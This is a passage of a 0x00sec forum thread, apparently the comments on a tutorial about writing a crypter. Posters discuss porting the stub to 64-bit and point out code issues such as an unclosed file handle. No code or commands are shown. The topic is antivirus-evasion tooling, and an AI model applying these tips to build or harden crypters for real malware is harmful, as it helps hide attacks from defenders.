<p>For this purpose, I use the stub itself. Since the stub is 32-bit, it cannot interact with those two processes on 64-bit machines (which I have).</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Cal0X"><span itemprop="name">Cal0X</span></a>
(Cal0X)
</span>
<link itemprop="mainEntityOfPage" href="386.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-18T16:00:03Z" class="post-time">
May 18, 2016, 4:00pm
</time>
<meta itemprop="dateModified" content="2016-05-18T16:00:03Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Yeah, I was asking in general. Just out of curiosity, what changes should be made in the program for 64 bit?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Merozey"><span itemprop="name">Merozey</span></a>
(Merozey)
</span>
<link itemprop="mainEntityOfPage" href="386.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-18T19:10:56Z" class="post-time">
May 18, 2016, 7:10pm
</time>
<meta itemprop="dateModified" content="2016-05-18T19:10:56Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Very nice article! I haven‚Äôt done much re-search on crypters, so i‚Äôm glad you are starting this series!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="386.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-05-19T01:05:27Z" class="post-time">
May 19, 2016, 1:05am
</time>
<meta itemprop="dateModified" content="2016-05-19T01:05:27Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I‚Äôm not entirely sure yet. I‚Äôve not had much experience with 64-bit to tell any differences from 32-bit but there shouldn‚Äôt need to be any changes except compiling the stub as 64-bit and having a 64-bit application.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/OWL"><span itemprop="name">OWL</span></a>
(OWLx2)
</span>
<link itemprop="mainEntityOfPage" href="386.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-05-13T17:17:49Z" class="post-time">
May 13, 2017, 5:17pm
</time>
<meta itemprop="dateModified" content="2017-05-13T17:17:49Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This really awesome post , detailed and very helpful information. thank you for sharing.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0xd4v3"><span itemprop="name">0xd4v3</span></a>
</span>
<link itemprop="mainEntityOfPage" href="386.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-01-16T23:13:41Z" class="post-time">
January 16, 2018, 11:13pm
</time>
<meta itemprop="dateModified" content="2018-01-17T00:25:03Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This is awesome! It‚Äôs quite hard getting used to the WinAPI, I hate these ‚Äúnew‚Äù data types. One question though‚Ä¶ Why aren‚Äôt you closing the <code>hFile</code> handle after reading it?</p>
<p>EDIT: The <code>GetCurrentDirectory()</code> stuff is unnecessary since <code>CreateFile</code> is going to create the file with <code>CRYPTED_FILE</code> name in the same directory. <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> Not trying to be a smartass just stating my findings while playing with the code. <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtm"><span itemprop="name">dtm</span></a>
</span>
<link itemprop="mainEntityOfPage" href="386.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-01-17T03:34:05Z" class="post-time">
January 17, 2018, 3:34am
</time>
<meta itemprop="dateModified" content="2018-01-17T03:34:05Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<aside class="quote no-group" data-username="0xd4v3" data-post="9" data-topic="386">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/0xd4v3/40/1449_2.png" class="avatar"> 0xd4v3:</div>
<blockquote>
<p>One question though‚Ä¶ Why aren‚Äôt you closing the hFile handle after reading it?</p>
</blockquote>
</aside>
<p>Because <span class="bbcode-s">skids</span> hackers write terrible code! Nah, probably because I forgot.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
Closed
</span>
<link itemprop="mainEntityOfPage" href="386.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-01-17T05:26:24Z" class="post-time">
January 17, 2018, 5:26am
</time>
<meta itemprop="dateModified" content="2018-01-17T05:26:24Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
